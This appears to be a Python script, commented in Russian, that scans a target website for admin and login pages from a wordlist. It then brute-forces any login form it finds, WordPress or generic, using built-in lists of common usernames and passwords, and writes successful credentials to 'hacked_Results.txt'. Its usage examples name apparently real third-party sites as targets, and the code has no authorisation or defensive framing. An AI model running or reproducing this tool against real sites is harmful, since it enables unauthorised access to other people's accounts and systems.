#!/usr/bin/env python3
"""
Сканер админки + автоматический брутфорс паролей
Работает с любыми сайтами (base44, WordPress, SPA)
"""

import requests
import sys
import re
import os
from urllib.parse import urljoin
from datetime import datetime

requests.packages.urllib3.disable_warnings()

# Топ паролей
TOP_PASSWORDS = [
    'admin', 'password', '123456', '12345678', '1234', '12345', 'admin123',
    'root', 'root123', 'toor', 'qwerty', 'abc123', '111111', '123123',
    'admin@123', 'Admin123', 'administrator', 'letmein', 'welcome', 'passw0rd',
    'pass123', 'admin1', 'user', 'test', 'demo', 'secret', 'changeme',
    '123456789', '987654321', '1q2w3e4r', 'zaq12wsx', 'qwerty123', 'adminpass',
    'Admin@123', 'P@ssw0rd', 'password123', 'default', 'guest', 'master'
]

# Топ логинов
TOP_LOGINS = ['admin', 'root', 'administrator', 'user', 'test', 'demo', 'manager', 'webmaster', 'admin1']

class AdminScanner:
    def __init__(self, target_url, wordlist_file):
        self.target_url = target_url.rstrip('/')
        self.wordlist_file = wordlist_file
        self.session = requests.Session()
        self.fake_size = None
        self.results = []  # Хранит результаты текущего запуска
        
    def calibrate(self):
        """Определяем размер фейковой страницы"""
        print("\n[1] Калибровка...")
        fake_url = urljoin(self.target_url, "/" + str(datetime.now().timestamp()))
        
        try:
            resp = self.session.get(fake_url, verify=False, timeout=10)
            self.fake_size = len(resp.text)
            print(f"    Фейковый размер: {self.fake_size} байт")
            print(f"    Статус: {resp.status_code}")
            return True
        except Exception as e:
            print(f"    Ошибка: {e}")
            return False
    
    def detect_login_form(self, html, url):
        """Определяет форму логина"""
        result = {
            'has_form': False,
            'page_url': url,
            'login_url': url,
            'username_field': 'username',
            'password_field': 'password',
            'is_wordpress': False
        }
        
        # Проверка на WordPress
        if 'wp-content' in html or 'wp-includes' in html:
            result['is_wordpress'] = True
            result['username_field'] = 'log'
            result['password_field'] = 'pwd'
            result['login_url'] = urljoin(self.target_url, '/wp-login.php')
            result['has_form'] = True
        
        # Поиск action в форме
        action_match = re.search(r'<form[^>]*action\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)
        if action_match:
            action = action_match.group(1)
            if action:
                result['login_url'] = urljoin(url, action)
        
        # Поиск поля пароля
        password_match = re.search(r'<input[^>]*type\s*=\s*["\']password["\'][^>]*name\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)
        if password_match:
            result['has_form'] = True
            result['password_field'] = password_match.group(1)
        
        # Поиск поля логина
        username_patterns = [
            r'<input[^>]*name\s*=\s*["\'](?:log|user|username|login|email|user_login|user_name)["\']',
            r'<input[^>]*id\s*=\s*["\'](?:user|username|login|email)["\']'
        ]
        
        for pattern in username_patterns:
            user_match = re.search(pattern, html, re.IGNORECASE)
            if user_match:
                result['has_form'] = True
                name_match = re.search(r'name\s*=\s*["\']([^"\']+)["\']', user_match.group(0), re.IGNORECASE)
                if name_match:
                    result['username_field'] = name_match.group(1)
                break
        
        return result
    
    def try_wordpress_login(self, login_url, page_url):
        """Проверка для WordPress"""
        print(f"\n   🔐 WordPress на странице: {page_url}")
        print(f"   Login URL: {login_url}")
        print(f"   Пробуем пароли...")
        print("-" * 50)
        
        for username in TOP_LOGINS[:10]:
            for password in TOP_PASSWORDS[:30]:
                try:
                    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
                    
                    response = self.session.post(login_url, data=data, verify=False, timeout=10, allow_redirects=False)
                    
                    if response.status_code in [301, 302]:
                        location = response.headers.get('Location', '')
                        if 'wp-admin' in location and 'login' not in location.lower():
                            print(f"\n   🏆 УСПЕХ! {username}:{password}")
                            return {'url': login_url, 'username': username, 'password': password, 'type': 'WordPress'}
                    
                    elif response.status_code == 200:
                        if 'dashboard' in response.text.lower() and 'login' not in response.text.lower():
                            print(f"\n   🏆 УСПЕХ! {username}:{password}")
                            return {'url': login_url, 'username': username, 'password': password, 'type': 'WordPress'}
                    
                    print(f"   Попытка: {username}:{password}", end='\r')
                    
                except Exception as e:
                    continue
        
        print(f"\n   ✗ Пароли не подошли для {page_url}")
        return None
    
    def try_generic_login(self, page_url, login_url, username_field, password_field):
        """Общая проверка логина"""
        print(f"\n   🔐 Форма на странице: {page_url}")
        print(f"   Action URL: {login_url}")
        print(f"   Поля: {username_field} / {password_field}")
        print(f"   Пробуем пароли...")
        print("-" * 50)
        
        for username in TOP_LOGINS[:10]:
            for password in TOP_PASSWORDS[:30]:
                try:
                    data = {username_field: username, password_field: password}
                    
                    response = self.session.post(login_url, data=data, verify=False, timeout=10, allow_redirects=False)
                    
                    # Проверка успеха
                    if response.status_code in [301, 302]:
                        location = response.headers.get('Location', '')
                        if 'login' not in location.lower() and 'error' not in location.lower():
                            print(f"\n   🏆 УСПЕХ! {username}:{password}")
                            print(f"   Редирект: {location}")
                            return {'url': page_url, 'login_url': login_url, 'username': username, 'password': password, 'type': 'Generic'}
                    
                    elif response.status_code == 200:
                        if 'dashboard' in response.text.lower() or 'admin' in response.text.lower():
                            if 'invalid' not in response.text.lower() and 'incorrect' not in response.text.lower():
                                print(f"\n   🏆 УСПЕХ! {username}:{password}")
                                return {'url': page_url, 'login_url': login_url, 'username': username, 'password': password, 'type': 'Generic'}
                    
                    print(f"   Попытка: {username}:{password}", end='\r')
                    
                except Exception as e:
                    continue
        
        print(f"\n   ✗ Пароли не подошли для {page_url}")
        return None
    
    def test_page(self, url, html):
        """Тестирует страницу"""
        form_info = self.detect_login_form(html, url)
        
        if form_info['has_form']:
            print(f"\n{'='*50}")
            print(f"🔐 НАЙДЕНА ФОРМА ВХОДА!")
            print(f"📁 Раздел: {url}")
            print(f"📝 Тип: WordPress" if form_info['is_wordpress'] else f"📝 Тип: Обычная форма")
            print(f"{'='*50}")
            
            if form_info['is_wordpress']:
                result = self.try_wordpress_login(form_info['login_url'], url)
            else:
                result = self.try_generic_login(
                    url,
                    form_info['login_url'],
                    form_info['username_field'],
                    form_info['password_field']
                )
            
            if result:
                self.results.append(result)
                print(f"\n{'#'*50}")
                print(f"🏆🏆🏆 УСПЕХ! ПАНЕЛЬ ВЗЛОМАНА! 🏆🏆🏆")
                print(f"{'#'*50}")
                print(f"📁 Страница: {result['url']}")
                if 'login_url' in result:
                    print(f"🔗 Login URL: {result['login_url']}")
                print(f"👤 Логин: {result['username']}")
                print(f"🔑 Пароль: {result['password']}")
                print(f"💾 Сохранено в: hacked_Results.txt")
                print(f"{'#'*50}\n")
                
                # Сохраняем результат
                with open('hacked_Results.txt', 'w') as f:
                    for r in self.results:
                        f.write(f"URL: {r['url']}\n")
                        f.write(f"Логин: {r['username']}\n")
                        f.write(f"Пароль: {r['password']}\n")
                        f.write(f"Тип: {r['type']}\n")
                        f.write("-" * 40 + "\n")
    
    def find_real_pages(self):
        """Находит реальные страницы"""
        print(f"\n[2] Загрузка wordlist: {self.wordlist_file}")
        
        try:
            with open(self.wordlist_file, 'r') as f:
                paths = [line.strip() for line in f if line.strip()]
            print(f"    Загружено {len(paths)} путей")
        except Exception as e:
            print(f"    Ошибка: {e}")
            return []
        
        print(f"\n[3] Сканирование {self.target_url}")
        print("=" * 70)
        
        # Быстрая проверка стандартных путей
        print("\n[!] Проверка стандартных CMS путей...")
        standard_paths = [
            '/wp-login.php', '/administrator/index.php', '/admin/login.php',
            '/admin/index.php', '/login.php', '/admin', '/administrator', '/login'
        ]
        
        for path in standard_paths:
            test_url = urljoin(self.target_url, path)
            try:
                resp = self.session.get(test_url, verify=False, timeout=5)
                if resp.status_code == 200 and abs(len(resp.text) - self.fake_size) > 200:
                    self.test_page(test_url, resp.text)
            except:
                pass
        
        # Полное сканирование
        print(f"\n[!] Полное сканирование словаря...")
        
        for i, path in enumerate(paths, 1):
            test_url = urljoin(self.target_url + '/', path)
            
            try:
                resp = self.session.get(test_url, verify=False, timeout=5)
                current_size = len(resp.text)
                
                if self.fake_size and abs(current_size - self.fake_size) > 200:
                    self.test_page(test_url, resp.text)
                    
                if i % 100 == 0:
                    print(f"[*] Прогресс: {i}/{len(paths)}", end='\r')
                    
            except Exception as e:
                continue
        
        print(f"\n\n[4] Сканирование завершено!")
    
    def run(self):
        """Запуск"""
        # Очищаем предыдущие результаты
        self.results = []
        
        print("=" * 70)
        print("🔍 ADMIN SCANNER + BRUTE FORCE 🔍")
        print("=" * 70)
        print(f"🎯 Цель: {self.target_url}")
        
        if not self.calibrate():
            print("Ошибка калибровки")
            return
        
        self.find_real_pages()
        
        # Итоги
        print("\n" + "=" * 70)
        print("📊 ИТОГОВЫЕ РЕЗУЛЬТАТЫ")
        print("=" * 70)
        
        if self.results:
            print(f"\n✅ НАЙДЕНО {len(self.results)} ВЗЛОМАННЫХ ПАНЕЛЕЙ:\n")
            for r in self.results:
                print(f"📍 URL: {r['url']}")
                print(f"👤 Логин: {r['username']}")
                print(f"🔑 Пароль: {r['password']}")
                print(f"📝 Тип: {r['type']}")
                print("-" * 40)
        else:
            print("\n❌ ВЗЛОМАННЫХ ПАНЕЛЕЙ НЕ НАЙДЕНО")
            print("\n💡 Возможные причины:")
            print("   1. Пароли не подошли (попробуйте добавить в TOP_PASSWORDS)")
            print("   2. Сайт использует капчу или 2FA")
            print("   3. Форма отправляется через AJAX (требуется ручной анализ)")
            print("   4. Сайт не имеет стандартной формы входа")

def main():
    if len(sys.argv) != 3:
        print("Использование: python3 scan.py <URL> <wordlist>")
        print("Примеры:")
        print("   python3 scan.py https://asiaconsult.uz admin_1000top.txt")
        print("   python3 scan.py https://habluz.base44.app admin_1000top.txt")
        sys.exit(1)
    
    # Очищаем старый файл результатов
    if os.path.exists('hacked_Results.txt'):
        os.remove('hacked_Results.txt')
    
    scanner = AdminScanner(sys.argv[1], sys.argv[2])
    scanner.run()

if __name__ == "__main__":
    main()